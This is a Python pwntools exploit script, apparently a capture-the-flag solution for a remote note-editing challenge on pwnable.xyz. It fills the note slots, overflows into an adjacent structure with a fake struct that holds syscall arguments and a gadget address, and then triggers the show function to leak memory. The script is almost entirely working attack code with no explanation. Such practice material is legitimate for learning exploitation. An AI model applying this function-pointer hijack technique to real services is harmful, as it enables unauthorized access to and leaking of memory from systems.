from pwn import *

def get_prompt():
	return p.recvuntil("3. Exit")

def edit_note(idx,data):
	p.sendline("1")
	p.recvuntil("Note id: ")
	p.sendline(str(idx))
	p.recvuntil("Contents: ")
	p.send(data)
	get_prompt()

def show_note(idx):
	p.sendline("2")
	p.recvuntil("Note id: ")
	p.sendline(str(idx))
	p.interactive()

p = remote("svc.pwnable.xyz", 30048)
get_prompt()
for i in range(9):
	edit_note(i,"A\n")

'''
00000000 id
00000008 note
00000010 size
00000018 serial
00000020 show
'''

syscall = 0x4000338
rax,rdi,rsi,rdx = 1,1,0x4100000,0x30
fake_struct = p64(rax)+p64(rdi)+p64(rsi)+p64(rdx)+p64(syscall)
edit_note(9,"A"*8+fake_struct+"\n")
show_note(0)

